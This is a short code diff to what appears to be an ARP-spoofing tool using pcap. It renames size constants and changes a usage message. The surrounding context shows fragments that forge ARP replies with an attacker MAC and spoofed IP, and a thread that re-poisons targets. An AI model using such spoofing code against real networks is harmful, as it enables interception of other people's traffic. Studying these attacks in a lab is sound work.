@@ -66,8 +66,8 @@ void sendArpRequest(pcap_t* handle, Ip target_ip) {
 
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     packet.arp_.pro_ = htons(EthHdr::Ip4);
-    packet.arp_.hln_ = Mac::SIZE;
-    packet.arp_.pln_ = Ip::SIZE;
+    packet.arp_.hln_ = Mac::Size;
+    packet.arp_.pln_ = Ip::Size;
     packet.arp_.op_ = htons(ArpHdr::Request);
     packet.arp_.smac_ = Mac(attacker_mac);
     packet.arp_.sip_ = htonl(attacker_ip);
@@ -100,8 +100,8 @@ void sendArpReply(pcap_t* handle, Ip sender_ip, Ip target_ip, Mac sender_mac) {
 
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     packet.arp_.pro_ = htons(EthHdr::Ip4);
-    packet.arp_.hln_ = Mac::SIZE;
-    packet.arp_.pln_ = Ip::SIZE;
+    packet.arp_.hln_ = Mac::Size;
+    packet.arp_.pln_ = Ip::Size;
     packet.arp_.op_ = htons(ArpHdr::Reply);
     packet.arp_.smac_ = Mac(attacker_mac);
     packet.arp_.sip_ = htonl(target_ip);
@@ -124,8 +124,7 @@ void* reinfectThread(void* arg) {
 
 int main(int argc, char* argv[]) {
     if (argc < 4 || argc % 2 != 0) {
-        printf("syntax: %s <interface> <sender ip 1> <target ip 1> [...]
-", argv[0]);
+        printf("syntax: %s <interface> <sender ip 1> <target ip 1> [...]", argv[0]);
         return -1;
     }
     const char* dev = argv[1];
